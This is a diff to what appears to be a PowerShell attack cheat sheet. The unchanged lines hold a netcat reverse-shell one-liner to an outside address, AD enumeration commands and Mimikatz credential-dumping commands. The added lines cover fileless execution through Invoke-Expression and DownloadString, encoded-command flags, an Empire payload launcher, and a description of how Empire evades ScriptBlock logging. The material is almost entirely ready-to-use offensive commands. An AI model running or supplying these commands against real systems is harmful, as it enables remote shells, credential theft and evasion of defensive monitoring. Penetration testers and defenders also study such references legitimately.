@@ -68,10 +68,14 @@ Check Last Password Change----Get-UserProperty -Properties pwdlastset
 Find Logged In Users----Get-NetLoggedOn -ComputerName &lt;ComputerName&gt;
 
 Basic NC connectback----powershell.exe -NoExit -Command 'C:/temp/temp2/nc.exe -v 192.168.99.21 4444 -e powershell'
+One-Liner (no script on disk)----Invoke-Expression
+Run remote script (in-memory)----DownloadString
+Encoded Commands----##-encodedcommand;-e;-en;-enc
+
 
 ##Mimikatz
 Dump Creds----Invoke-Mimikatz -DumpCreds -ComputerName remotehost
 Execute Classic Mimikatz Commands----Invoke-Mimikatz -Command '"privilege::debug"'
 
-
-
+Empire Powershell Payload----powershell -noP -sta -w1 -enc &lt;base64-encoded-payload&gt;
+ScriptBlock Logging----Logging feature that captures PS scripts in readable form.  Empire may bypass by unhooking it via "cachedGroupPolicySettings" variable manipulation.  It may also nullify the "suspicious strings" array.  
